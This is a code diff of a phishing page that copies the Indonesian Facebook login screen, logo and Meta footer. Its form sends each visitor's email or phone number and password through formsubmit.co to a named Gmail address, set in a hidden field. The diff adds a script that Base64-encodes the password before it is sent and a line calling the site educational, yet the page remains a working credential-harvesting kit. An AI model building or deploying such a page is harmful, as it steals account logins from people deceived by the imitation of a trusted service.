@@ -20,14 +20,6 @@
             margin: 0;
             flex-direction: column;
         }
-        .language-switch {
-            text-align: center;
-            font-size: 14px;
-            color: black;
-            position: absolute;
-            top: 10px;
-            cursor: pointer;
-        }
         .container {
             background-color: #fff;
             padding: 40px;
@@ -89,16 +81,21 @@
             color: gray;
             text-align: center;
         }
+        .disclaimer {
+            font-size: 12px;
+            color: gray;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-    <div class="language-switch" onclick="toggleLanguage()">Bahasa Indonesia</div>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
         
-        <form action="https://formsubmit.co/droidmega724@gmail.com" method="POST">
+        <form action="https://formsubmit.co/" method="POST">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_email" value="droidmega724@gmail.com">
             <input type="email" id="email" name="email" class="input-field" placeholder="Nomor ponsel atau email" required>
             <input type="password" id="password" name="password" class="input-field" placeholder="Kata sandi" required autocomplete="off">
             <button type="submit" class="login-btn">Login</button>
@@ -107,63 +104,17 @@
         <a href="#" class="forgot-password">Lupa kata sandi?</a>
         <button class="new-account-btn">Buat akun baru</button>
         <div class="meta">© Meta</div>
+
+        <p class="disclaimer">
+            Situs ini bukan bagian dari Facebook atau Meta. Ini hanya digunakan untuk keperluan edukasi.
+        </p>
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const emailField = document.getElementById("email");
-            const passwordField = document.getElementById("password");
-            const langSwitch = document.querySelector(".language-switch");
-
-            function updateValidationMessages() {
-                if (langSwitch.innerText === "Bahasa Indonesia") {
-                    emailField.setCustomValidity("Silakan isi email atau nomor ponsel!");
-                    passwordField.setCustomValidity("Silakan isi kata sandi!");
-                } else {
-                    emailField.setCustomValidity("Please enter your phone number or email!");
-                    passwordField.setCustomValidity("Please enter your password!");
-                }
-            }
-
-            emailField.oninvalid = function (event) {
-                updateValidationMessages();
-            };
-            emailField.oninput = function (event) {
-                event.target.setCustomValidity("");
-            };
-
-            passwordField.oninvalid = function (event) {
-                updateValidationMessages();
-            };
-            passwordField.oninput = function (event) {
-                event.target.setCustomValidity("");
-            };
+        document.querySelector("form").addEventListener("submit", function(event) {
+            let passwordField = document.getElementById("password");
+            passwordField.value = btoa(passwordField.value); // Encode password ke Base64
         });
-
-        function toggleLanguage() {
-            let langSwitch = document.querySelector(".language-switch");
-            let emailInput = document.getElementById("email");
-            let passwordInput = document.getElementById("password");
-            let forgotPassword = document.querySelector(".forgot-password");
-            let createAccount = document.querySelector(".new-account-btn");
-
-            if (langSwitch.innerText === "Bahasa Indonesia") {
-                langSwitch.innerText = "English";
-                emailInput.placeholder = "Phone number or email";
-                passwordInput.placeholder = "Password";
-                forgotPassword.innerText = "Forgot password?";
-                createAccount.innerText = "Create new account";
-            } else {
-                langSwitch.innerText = "Bahasa Indonesia";
-                emailInput.placeholder = "Nomor ponsel atau email";
-                passwordInput.placeholder = "Kata sandi";
-                forgotPassword.innerText = "Lupa kata sandi?";
-                createAccount.innerText = "Buat akun baru";
-            }
-        }
     </script>
 </body>
 </html>
-<p style="font-size: 12px; color: gray; margin-top: 10px;">
-    Situs ini bukan bagian dari Facebook atau Meta. Ini hanya digunakan untuk keperluan edukasi.
-</p>
